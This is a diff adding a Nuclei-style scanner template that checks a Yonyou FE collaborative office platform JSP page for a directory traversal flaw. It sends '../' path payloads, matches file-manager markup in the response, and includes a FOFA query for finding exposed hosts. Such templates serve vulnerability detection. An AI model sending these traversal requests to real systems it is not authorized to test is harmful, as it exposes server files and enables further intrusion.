@@ -1,0 +1,32 @@
+id: templateOfTaohong_manager
+info:
+  name: 用友 FE_templateOfTaohong_manager_traversal
+  author: mike
+  severity: info
+  description: 用友 FE协作办公平台 templateOfTaohong_manager.jsp文件存在目录遍历漏洞，通过漏洞攻击者可以获取目录文件等信息，导致进一步攻击
+  reference: https://www.cnblogs.com/pursue-security/p/17684989.html
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: "FE协作"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../"
+      - "{{BaseURL}}/system/mediafile/templateOfTaohong_manager.jsp?path=/../../"
+      - "{{BaseURL}}/system/mediafile/templateOfTaohong_manager.jsp?path=/../"
+      - "{{BaseURL}}/system/mediafile/templateOfTaohong_manager.jsp?path=/"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'onclick="uploadfile()"'
+          - 'id="floder"'
+          - 'onclick="newfloder'
+        part: body
+        condition: and
+
+      - type: status
+        status:
+          - 200
